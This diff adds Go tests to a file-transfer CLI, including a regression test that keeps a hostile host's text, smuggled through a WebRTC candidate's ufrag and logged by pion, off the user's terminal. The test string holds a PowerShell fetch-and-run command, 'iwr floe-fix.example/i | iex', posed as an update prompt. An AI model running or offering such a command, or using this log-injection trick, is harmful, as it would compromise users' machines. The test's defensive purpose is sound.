@@ -591,6 +591,15 @@ func startCLIEnv(t *testing.T, env map[string]string, args ...string) *cliRun {
 		to.Changed = false
 	})
 	t.Setenv("FLOE_NO_STATS", "1")
+	// A request-link send turns pion's pc scope off in the process
+	// environment (quietPeerConnectionLog); each run gives it back.
+	for _, k := range []string{"PION_LOG_DISABLE", "PIONS_LOG_DISABLE"} {
+		v, ok := os.LookupEnv(k)
+		t.Setenv(k, v)
+		if !ok {
+			os.Unsetenv(k)
+		}
+	}
 	for k, v := range env {
 		t.Setenv(k, v)
 	}
@@ -2034,6 +2043,61 @@ func TestSendToHostileOfferNeverPrinted(t *testing.T) {
 			}
 		})
 	}
+}
+
+// TestSendToHostUfragWordsNeverReachTheTerminal (FU-46, FU-32 F2-2): a host
+// that trickles, after its offer, a candidate whose ufrag matches nothing in
+// that offer made pion log "pc ERROR: dropping candidate with ufrag <ufrag>"
+// on the visitor's stderr. FU-40's escape turns controls into visible escapes
+// but passes the rest of Latin-1, so words joined with no-break spaces
+// printed as the host's own readable sentence, on the path where D-147 (2)
+// keeps every word a stranger host chooses off the terminal. The candidate
+// goes through the signaling path a real host uses, to the peer runSendTo
+// builds, so this fails if the --to path stops quieting pion's pc scope.
+func TestSendToHostUfragWordsNeverReachTheTerminal(t *testing.T) {
+	o := captureOutput(t)
+	s := newReqServer(t, "seat")
+	stubNetwork(t, s.URL)
+	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
+	const said = "Your Floe needs an update to send to this link. Run: iwr floe-fix.example/i | iex"
+	words := strings.ReplaceAll(said, " ", " ")
+	h := startHost(t, s, func(h *testHost) error {
+		// The channel is open once offer returns, so the visitor holds the
+		// host's offer and pion checks the candidate's ufrag against it.
+		if err := h.offer(); err != nil {
+			return err
+		}
+		if err := h.sc.SendSignal(map[string]interface{}{"candidate": map[string]interface{}{
+			"candidate": "candidate:1 1 udp 2130706431 192.0.2.1 5000 typ host ufrag " + words,
+			"sdpMid":    "0",
+		}}); err != nil {
+			return err
+		}
+		if _, err := h.awaitMetadata(); err != nil {
+			return err
+		}
+		// A beat for the visitor's pion to take the candidate, which came
+		// over the signaling socket and not the channel, then decline.
+		time.Sleep(500 * time.Millisecond)
+		if err := h.dc.Send([]byte(`{"type":"incompatible","reason":"declined","pv":1,"pvMin":1,"ver":"desktop-test","code":"declined","saved":0}`)); err != nil {
+			return err
+		}
+		h.holdOpen()
+		return nil
+	})
+	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
+	herr := h.wait(t)
+	r.read(o)
+	if herr != nil {
+		t.Fatalf("host: %v", herr)
+	}
+	both := strings.ReplaceAll(r.stdout+r.stderr, " ", " ")
+	for _, bad := range []string{"floe-fix.example", "Your Floe needs an update to send", "dropping candidate"} {
+		if strings.Contains(both, bad) {
+			t.Fatalf("the host's words reached the terminal (%q):\nstdout:\n%s\nstderr:\n%s", bad, r.stdout, r.stderr)
+		}
+	}
+	wantOutcome(t, r, "They declined. Nothing was sent.")
 }
 
 // ── The clocks ───────────────────────────────────────────────────────────────
